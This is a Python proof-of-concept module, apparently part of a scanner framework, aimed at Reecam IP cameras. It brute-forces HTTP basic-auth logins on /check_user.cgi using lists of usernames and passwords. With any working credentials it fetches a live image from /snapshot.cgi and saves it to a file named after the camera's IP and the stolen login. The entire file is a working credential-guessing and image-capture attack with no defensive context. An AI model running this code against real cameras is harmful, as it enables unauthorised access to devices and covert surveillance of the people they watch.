import requests

from loguru import logger

from .base import POCTemplate


class ReecamWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['reecam']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    r = requests.get(
                        url=f"http://{user}:{password}@{ip}:{port}/check_user.cgi",
                        timeout=self.config.timeout,
                        headers=self.headers,
                        verify=False,
                        stream=True
                    )
                    if r.status_code == 200:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = f"http://{user}:{password}@{ip}:{port}/snapshot.cgi"
        return self._snapshot(url, img_file_name)

POCTemplate.register_poc(ReecamWeakPassword)
